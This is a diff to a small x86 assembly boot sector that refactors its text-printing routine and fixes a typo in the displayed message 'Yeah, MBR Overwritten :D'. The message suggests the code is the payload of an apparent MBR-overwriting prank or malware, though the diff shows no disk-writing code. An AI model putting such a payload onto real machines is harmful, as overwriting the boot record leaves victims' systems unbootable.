@@ -9,19 +9,20 @@ start:
         mov si,msg
 
         call print
+        jmp $
 
 print:
-        push ax
+        pusha
         cld
 next:
-        mov al,[si]
-        cmp al,0
-        je done
+        lodsb
+        or al, al
+        jz done
         call printchar
-        inc si
         jmp next
 done:
-        jmp $
+        popa
+        ret
 
 printchar:
         mov ah,0x0e
@@ -37,6 +38,6 @@ clear_screen:
         int 0x10
         ret
 
-msg:            db        "Okay Here is my tut of internet.",13,10,"so here you can se my project operative 100%.",13,10,"Yeah, MBR Overwrited :D", 0
+msg:            db        "Okay Here is my tut of internet.",13,10,"so here you can se my project operative 100%.",13,10,"Yeah, MBR Overwritten :D", 0
 times 510 - ($-$$) db 0
 dw        0xaa55
